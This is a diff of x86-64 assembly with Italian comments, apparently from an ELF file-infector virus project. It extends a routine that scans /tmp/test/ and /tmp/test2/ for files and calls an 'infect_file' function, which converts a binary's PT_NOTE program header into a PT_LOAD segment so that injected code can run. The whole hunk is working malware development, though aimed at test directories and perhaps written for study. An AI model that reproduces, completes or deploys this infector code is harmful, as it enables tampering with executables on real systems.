@@ -75,18 +75,17 @@ _start:
 
     mov rdi, rsp
     add rdi, 16                       ; passo come argomento /tmp/test/
-    call chdir
+    call chdir                        ; chdir
 
-    mov rdi, rsp
-    add rdi, 16                       ; passo come argomento /tmp/test/
     mov rsi, 0
-    call open
-    test rax, rax
-    js exit
+    call open                         ; open /tmp/test/
+    cmp rax, 0
+    jl exit
     push rax                          ; salvo nello stack fd cartella
 
     sub rsp, 32768                    ; riservo spazio nello stack per lettura getdents64
-    mov rdi, rsp                      ; passo come argomento lo spazio riservato
+    mov rsi, rsp                      ; passo come argomento lo spazio riservato
+    mov rdi, [rsp+32768]
     call getdents64
     push rax                          ; salvo nello stack totale letto da getdents64
 
@@ -99,6 +98,31 @@ _start:
     add rdi, 4104                     ; rdi = puntatore struct
     call loop_indir
 
+    ;test2
+    mov rdi, rsp
+    add rdi, 36880                    ; passo come argomento /tmp/test2/
+    call chdir                        ; chdir
+
+    mov rsi, 0
+    call open                         ; open
+    cmp rax, 0
+    jl exit
+    mov [rsp+4096+8+32768], rax       ; salvo fd
+
+    mov rdi, [rsp+4096+8+32768]       ; rdi = fd
+    mov rsi, rsp
+    add rsi, 4104                     ; rsi = spazio riservato
+    call getdents64                   ; getdents64
+    mov [rsp+4096], rax               ; salvo quantità letta
+
+    mov rdi, [rsp+4096+8+32768]       ; fd da chiudere
+    call closefd                      ; close
+
+    mov r10, rsp                      ; r10 = struttura stat
+    mov rdi, rsp
+    add rdi, 4104                     ; rdi = dati letti da getdents64
+    call loop_indir
+
     jmp exit
 
 open:                                 ; rdi = fd, rsi = permessi
@@ -107,9 +131,7 @@ open:                                 ; rdi = fd, rsi = permessi
     syscall
     ret
 
-getdents64:
-    mov rsi, rdi                      ; struct linux_dirent64 *dirent
-    mov rdi, [rsp+32768+8]            ; fd
+getdents64:                           ; rdi = fd, rsi = spazio riservato
     mov rdx, 32768                    ; quantità da leggere
     mov rax, 217
     syscall
@@ -137,9 +159,11 @@ loop_indir:                           ; rdi = ptr struct, r10 = puntatore buffer
         push r10
         mov rdi, rdi
         add rdi, dirent.d_name        ; rdi = ptr nome file
-        mov rsi, r10
-        mov rax, 4
+        mov rsi, r10                  ; spazio per la struttura
+        mov rax, 4                    ; stat
         syscall
+        cmp rax, 0
+        jl .restore
         xor rax, rax
         mov rcx, [rsi+24]             ; rcx = st_mode
         mov si, 1                     ; rsi = 1
@@ -233,11 +257,11 @@ infect_file:                          ; rdi = ptr nome file
         jb .loop
     .end:
 ; close
-    mov rdi, [rsp+36920]
-    call closefd
+        mov rdi, [rsp+36920]
+        call closefd
 ; ret
     .ret:
-    ret
+        ret
 
     .finded:                          ; rcx = ptr section PT_NOTE
     mov dword [rcx+phdr.p_type], 1    ; PT_LOAD
